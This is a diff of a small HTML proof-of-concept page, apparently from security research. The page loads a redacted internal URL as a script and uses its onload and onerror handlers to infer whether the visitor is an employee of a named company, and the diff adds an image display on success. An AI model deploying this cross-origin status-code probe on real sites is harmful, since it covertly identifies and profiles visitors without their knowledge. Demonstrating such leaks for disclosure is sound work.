@@ -3,7 +3,18 @@
         <title>Status code diff</title>
     </head>
     <body>
-        <h2>Status Code Diff</h2>
-        <script src="***REMOVED***" onload="alert('user is employee of dreamplug')" onerror="alert('user is not an employee of dreamplug')"></script>
+        <script>
+            function panik(url){
+            var img = document.createElement("img");
+            img.src = url;
+            var src = document.getElementById("header");
+            src.appendChild(img);
+        }
+        </script>
+        <center>
+            <h2>Status Code Diff</h2>
+            <div id="header"></div>
+        </center>
+        <script src="***REMOVED***" onload="alert('user is employee of dreamplug');panik('panik.jpeg')" onerror="alert('user is not an employee of dreamplug')"></script>
     </body>
 </html>
